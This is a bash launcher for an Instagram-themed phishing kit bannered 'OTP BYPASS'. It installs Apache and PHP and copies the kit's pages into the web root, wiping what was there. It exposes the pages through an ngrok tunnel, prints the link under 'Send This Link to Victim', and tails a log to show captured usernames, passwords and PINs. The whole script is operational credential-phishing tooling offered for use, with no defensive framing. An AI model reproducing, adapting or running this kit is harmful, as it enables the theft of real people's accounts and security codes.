#!/bin/bash 

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

} 


sleep 2
# spinner
spinlong ()
{
   bar=" +++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
   barlenght=${#bar}
   i=o
   while ((i < 100 )); do
	   n=$((i*barlenght / 100 ))
	   printf "\e[00;32m\r[%-${barlenght}s]\e[00m" "${bar:0:n}"
	   ((i += RANDOM%5+2))
	   sleep 0.4
   done
}


#clolors
white='\e[1;37m'
green='\e[0;32m'
blue='\e[1;34m'
red='\e[1;31m'
yellow='\e[1;33m' 
echo ""
echo ""
echo ""
                 clear
                 echo -e $yellow      "                           ┬┌┐┌┌─┐┌┬┐┌─┐┌─┐┌─┐┬  ┬  ┌─┐┬ ┬   ┌─┐┬ ┬┬┌─┐┬ ┬       "
                 echo -e $yellow      "                           ││││└─┐ │ ├─┤├┤ │ ││  │  │ ││││───├─┘├─┤│└─┐├─┤       " 
                 echo -e $yellow      "                           ┴┘└┘└─┘ ┴ ┴ ┴└  └─┘┴─┘┴─┘└─┘└┴┘   ┴  ┴ ┴┴└─┘┴ ┴       "
                 echo -e $white       "                           +++++++++++++++ OTP BYPASS ++++++++++++++++++++++++   "          
                                                   
                                                   
 
                echo ""
                echo ""
                echo -e $'\e[1;32m[\e[0m\e[1;77m+\e[0m\e[1;32m]\e[0m\e[1;33m >> DOWNLOAD REQUIREMENTS >> \e[0m'
                sleep 2
                echo""
                sudo apt-get install apache2
		apt install php
                apt install jq
                apt install tail
                apt install curl
                systemctl start apache2
		apt install xterm
		apt install gnome-terminal
		systemctl restart apache2.service
		mkdir /var
		mkdir /var/www
		mkdir /var/www/html
		mv /var/www/html/* /var/www/
		rm -rf /var/www/html/*
		cp -R * /var/www/html/
		cd ..
                clear
		cd /var/www/html/
                chmod +x *
		chmod 7777 *
		sleep 3
                clear
                ./ngrok http 80 > /dev/null &
                
                echo ""
                echo -e $'\e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;92m >> WAIT FOR NGROK UP !\e[0m'
                sleep 25
                echo ""    
                clear  
                ./Logo.sh
                echo ""                    
                echo   -e $yellow "// [ Send This Link to Victim ] //"
                echo ""
                echo -e $white
                curl -s localhost:4040/api/tunnels | jq -r .tunnels[1].public_url
                curl -s localhost:4040/api/tunnels | jq -r .tunnels[0].public_url
                echo ""
                echo ""
                echo -e $green "//  [ CREDENTIAL ] //"
                echo ""
                tail -f log.txt | grep -e "username" -e "password" -e "password" -e "pin" -e "Pin"



                ;;
	        
